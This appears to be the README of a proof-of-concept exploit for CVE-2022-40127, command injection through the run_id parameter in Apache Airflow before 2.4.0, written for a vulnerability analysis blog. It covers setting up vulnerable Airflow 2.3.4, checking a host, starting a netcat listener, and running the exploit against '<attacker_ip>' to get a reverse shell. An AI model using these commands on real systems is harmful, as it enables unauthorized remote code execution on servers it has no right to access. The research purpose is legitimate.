> A vulnerability in Example Dags of Apache Airflow allows an attacker with UI access who can trigger DAGs, to execute arbitrary commands via manually provided run_id parameter. This issue affects Apache Airflow Apache Airflow versions prior to 2.4.0. 

The repo is created for a CVE analysis blog post available at vsociety.

## Usage
You can clone the repo by this command:
```bash
git clone https://github.com/jakabakos/CVE-2022-40127.git
```

## Install and run Apache Airflow v2.3.4

### Via docker-compose
Download the docker-compose file from the official repo
```bash
cd /opt/
mkdir airflow-2.3.4 && cd airflow-2.3.4
curl -LfO 'https://airflow.apache.org/docs/apache-airflow/2.3.4/docker-compose.yaml'
```
Run Airflow
```bash
mkdir -p ./dags ./logs ./plugins
echo -e "AIRFLOW_UID=$(id -u)" > .env
docker-compose up airflow-init
docker-compose up
open localhost:8080
```
In this case both the username and password will be `airflow`.

### Manually
Based on the [official install instructions](https://airflow.apache.org/docs/apache-airflow/2.3.4/installation/installing-from-pypi.html):
```bash
pip3.8 install "apache-airflow==2.3.4" --constraint "https://raw.githubusercontent.com/apache/airflow/constraints-2.3.4/constraints-3.7.txt"
```
You can verify if installation was successful with commands `which airflow` and/or `airflow info`.

Run Airflow
```bash
airflow standalone
```
See the generated password and username in the logs.


## Using the exploit

First, install the required packeges with pip:
```bash
pip3 install -r requirements.txt
```
See the possible options with:
```bash
python3 exploit.py --help
```
You can check if the host can be exploited or not:
```bash
python3 exploit.py -u airflow -p airflow -url http://localhost:8080
```

Set up a local listener for the reverse shell in a different terminal session:
```bash
nc -lvnp 4242
```

Run the script in attack mode with this command:
```bash
python3 exploit.py -u airflow -p airflow -url http://localhost:8080 -a -host <attacker_ip> -port 4242
```
You should see the connection within a minute or so.
